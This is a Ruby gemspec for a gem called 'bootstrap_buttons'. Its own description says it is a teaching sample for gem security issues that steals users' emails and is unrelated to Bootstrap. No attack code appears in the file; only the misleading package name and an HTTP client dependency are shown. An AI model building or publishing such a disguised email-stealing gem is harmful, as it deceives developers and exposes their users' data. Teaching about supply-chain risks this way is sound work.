# coding: utf-8
lib = File.expand_path('../lib', __FILE__)
$LOAD_PATH.unshift(lib) unless $LOAD_PATH.include?(lib)
require 'bootstrap_buttons/version'

Gem::Specification.new do |spec|
  spec.name          = "bootstrap_buttons"
  spec.version       = BootstrapButtons::VERSION
  spec.authors       = ["Elad Meidar"]
  spec.email         = ["elad@eizesus.com"]
  spec.description   = "DO NOT INSTALL THIS GEM - IT IS ONLY FOR TEACHING GEM SECURITY ISSUES"
  spec.summary       = "THIS GEM WILL STEAL YOUR USER'S EMAILS - DO NOT INSTALL - IT HAS NOTHING TO DO WITH BOOTSTRAP"
  spec.homepage      = ""
  spec.license       = "MIT"

  spec.files         = `git ls-files`.split($/)
  spec.executables   = spec.files.grep(%r{^bin/}) { |f| File.basename(f) }
  spec.test_files    = spec.files.grep(%r{^(test|spec|features)/})
  spec.require_paths = ["lib"]

  spec.add_development_dependency "bundler", "~> 1.3"
  spec.add_development_dependency "rake"
  spec.add_dependency 'httparty'
end
